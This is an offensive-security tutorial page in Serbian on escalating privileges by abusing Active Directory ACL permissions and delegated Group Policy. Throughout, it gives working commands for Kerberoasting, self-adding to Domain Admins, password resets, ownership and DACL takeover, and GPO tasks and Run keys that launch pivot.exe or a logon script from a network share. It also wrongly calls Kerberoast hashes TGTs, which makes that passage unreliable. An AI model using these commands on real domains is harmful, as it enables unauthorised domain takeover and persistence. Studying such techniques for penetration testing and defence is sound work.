# Abusing Active Directory ACLs/ACEs

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Ova stranica je uglavnom sažetak tehnika sa** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, proverite originalne članke.**

## **GenericAll Prava na Korisnika**

Ovo ovlašćenje daje napadaču potpunu kontrolu nad korisničkim nalogom. Kada se potvrde `GenericAll` prava korišćenjem `Get-ObjectAcl` komande, napadač može:

* **Promeniti Lozinku Mete**: Korišćenjem `net user <korisničko_ime> <lozinka> /domain`, napadač može resetovati korisnikovu lozinku.
* **Ciljani Kerberoasting**: Dodeliti SPN korisničkom nalogu kako bi bio kerberoastable, zatim koristiti Rubeus i targetedKerberoast.py da izvuče i pokuša da dešifruje heševe tiketa za dodelu karata (TGT).

```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

* **Ciljano ASREPRoasting**: Onemogućite predautentikaciju za korisnika, čime se njihov nalog čini ranjivim na ASREPRoasting.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## **GenericAll Prava na Grupu**

Ova privilegija omogućava napadaču da manipuliše članstvom u grupi ako ima `GenericAll` prava na grupu poput `Domain Admins`. Nakon identifikacije razlikovnog imena grupe pomoću `Get-NetGroup`, napadač može:

* **Dodati Sebe u Grupu Domain Admins**: Ovo se može uraditi direktnim komandama ili korišćenjem modula poput Active Directory ili PowerSploit.

```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

## **GenericAll / GenericWrite / Write na računaru/korisniku**

Imanje ovih privilegija na računaru ili korisničkom nalogu omogućava:

* **Kerberos Resursno ograničeno preusmeravanje**: Omogućava preuzimanje računarskog objekta.
* **Senke akreditiva**: Koristite ovu tehniku da se predstavite kao računar ili korisnički nalog iskorišćavanjem privilegija za stvaranje senki akreditiva.

## **WriteProperty na grupi**

Ako korisnik ima prava `WriteProperty` na svim objektima za određenu grupu (npr. `Domain Admins`), mogu:

* **Dodati sebe u grupu Domain Admins**: Moguće je kombinovanjem komandi `net user` i `Add-NetGroupUser`, ovaj metod omogućava eskalaciju privilegija unutar domena.

```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Samostalno (Samopridruživanje) grupi**

Ova privilegija omogućava napadačima da dodaju sebe u određene grupe, poput `Domain Admins`, kroz komande koje direktno manipulišu članstvom u grupi. Korišćenje sledećeg niza komandi omogućava samopridruživanje:

```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Samopridruživanje)**

Slična privilegija, omogućava napadačima da direktno dodaju sebe u grupe modifikujući svojstva grupa ako imaju pravo `WriteProperty` na tim grupama. Potvrda i izvršenje ove privilegije se vrše sa:

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Zadržavanje `ExtendedRight` na korisniku za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegova eksploatacija mogu se obaviti putem PowerShell-a ili alternativnih alata komandne linije, nudeći nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i jednolinijske naredbe za neinteraktivna okruženja. Naredbe variraju od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linuxu, demonstrirajući raznovrsnost vektora napada.

```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner na grupi**

Ako napadač otkrije da ima prava `WriteOwner` nad grupom, može promeniti vlasništvo nad grupom na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Proces uključuje identifikaciju odgovarajućeg objekta putem `Get-ObjectAcl` i zatim korišćenje `Set-DomainObjectOwner` za modifikaciju vlasnika, bilo preko SID-a ili imena.

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite na korisniku**

Ova dozvola omogućava napadaču da izmeni svojstva korisnika. Konkretno, sa pristupom `GenericWrite`, napadač može promeniti putanju logon skripte korisnika kako bi izvršio zlonamernu skriptu prilikom prijavljivanja korisnika. Ovo se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika kako bi pokazivalo ka skripti napadača.

```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

## **GenericWrite na grupi**

Sa ovom privilegijom, napadači mogu manipulisati članstvom u grupi, dodajući sebe ili druge korisnike u određene grupe. Ovaj proces uključuje kreiranje objekta za akreditaciju, korišćenje istog za dodavanje ili uklanjanje korisnika iz grupe, i proveru promena u članstvu pomoću PowerShell komandi.

```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

## **WriteDACL + WriteOwner**

Vlasništvo nad AD objektom i posedovanje privilegija `WriteDACL` omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. Ovo se postiže manipulacijom ADSI-ja, omogućavajući potpunu kontrolu nad objektom i mogućnost modifikacije njegovih članstava u grupama. Ipak, postoje ograničenja prilikom pokušaja iskorišćavanja ovih privilegija korišćenjem `Set-Acl` / `Get-Acl` komandi Active Directory modula.

```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

## **Replikacija na domenu (DCSync)**

DCSync napad koristi specifične dozvole za replikaciju na domenu kako bi imitirao kontroler domena i sinhronizovao podatke, uključujući korisničke podatke. Ova moćna tehnika zahteva dozvole poput `DS-Replication-Get-Changes`, omogućavajući napadačima da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa kontroleru domena. [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## Delegacija GPO-a <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacija GPO-a

Delegirani pristup za upravljanje objektima grupne politike (GPO) može predstavljati značajne sigurnosne rizike. Na primer, ako je korisnik poput `offense\spotless` delegiran sa pravima upravljanja GPO-ima, mogu imati privilegije poput **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu biti zloupotrebljene u zlonamerne svrhe, kao što je identifikacija korišćenjem PowerView-a: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Nabrojavanje dozvola GPO-a

Da biste identifikovali nepravilno konfigurisane GPO-e, cmdleti PowerSploit-a mogu biti povezani zajedno. Ovo omogućava otkrivanje GPO-a koje određeni korisnik ima dozvole da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari sa primenjenom određenom politikom**: Moguće je utvrditi na koje računare se odnosi određena GPO, pomažući u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određeni računar**: Da biste videli koje politike su primenjene na određeni računar, mogu se koristiti komande poput `Get-DomainGPO`.

**OU sa primenjenom određenom politikom**: Identifikacija organizacionih jedinica (OU) pogođenih određenom politikom može se obaviti korišćenjem `Get-DomainOU`.

### Zloupotreba GPO-a - New-GPOImmediateTask

Nepravilno konfigurisani GPO-i mogu biti iskorišćeni za izvršavanje koda, na primer, kreiranjem odmah zakazanog zadatka. Ovo se može uraditi kako bi se dodao korisnik u lokalnu administratorsku grupu na pogođenim mašinama, značajno povećavajući privilegije:

```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy modul - Zloupotreba GPO

GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, postavljanje preferencija kao što su vrednosti registra za izvršavanje zadnjih vrata na pogođenim računarima. Ovaj metod zahteva ažuriranje GPO-a i prijavljivanje korisnika na računar radi izvršavanja:

```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Zloupotreba GPO

SharpGPOAbuse nudi metod za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili modifikovanjem postavki bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva modifikaciju postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene promena:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Prisilno ažuriranje politike

Ažuriranja GPO obično se dešavaju svakih oko 90 minuta. Da bi se ubrzao ovaj proces, posebno nakon implementacije promene, može se koristiti komanda `gpupdate /force` na ciljnom računaru kako bi se prinudilo odmahšnje ažuriranje politike. Ova komanda osigurava da se bilo kakve modifikacije GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Pod Haubom

Prilikom inspekcije Zakazanih zadataka za određeni GPO, poput `Pogrešno konfigurisane politike`, može se potvrditi dodavanje zadataka poput `zlonamerniZadatak`. Ovi zadaci se kreiraju putem skripti ili alata za komandnu liniju sa ciljem modifikacije ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, kako je prikazano u XML konfiguracionom fajlu generisanom pomoću `New-GPOImmediateTask`, detaljno opisuje zakazani zadatak - uključujući komandu koja će biti izvršena i njene okidače. Ovaj fajl predstavlja kako su zakazani zadaci definisani i upravljani unutar GPO-a, pružajući metod za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.

### Korisnici i Grupe

GPO takođe omogućava manipulaciju članstva korisnika i grupa na ciljnim sistemima. Uređivanjem fajlova politike Korisnici i Grupe direktno, napadači mogu dodati korisnike u privilegovane grupe, poput lokalne grupe `administratori`. Ovo je moguće putem delegiranja dozvola za upravljanje GPO-om, što omogućava modifikaciju fajlova politike radi uključivanja novih korisnika ili promene članstva u grupama.

XML konfiguracioni fajl za Korisnike i Grupe detaljno opisuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu biti dodeljene povišene privilegije na pogođenim sistemima. Ovaj metod pruža direktni pristup eskalaciji privilegija putem manipulacije GPO-om.

Osim toga, dodatne metode za izvršavanje koda ili održavanje postojanosti, poput iskorišćavanja skripti za prijavljivanje/odjavljivanje, modifikacije registarskih ključeva za autorun, instaliranje softvera putem .msi fajlova ili uređivanje konfiguracija servisa, takođe se mogu razmotriti. Ove tehnike pružaju različite načine za održavanje pristupa i kontrolisanje ciljnih sistema putem zloupotrebe GPO-a.

## Reference

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)
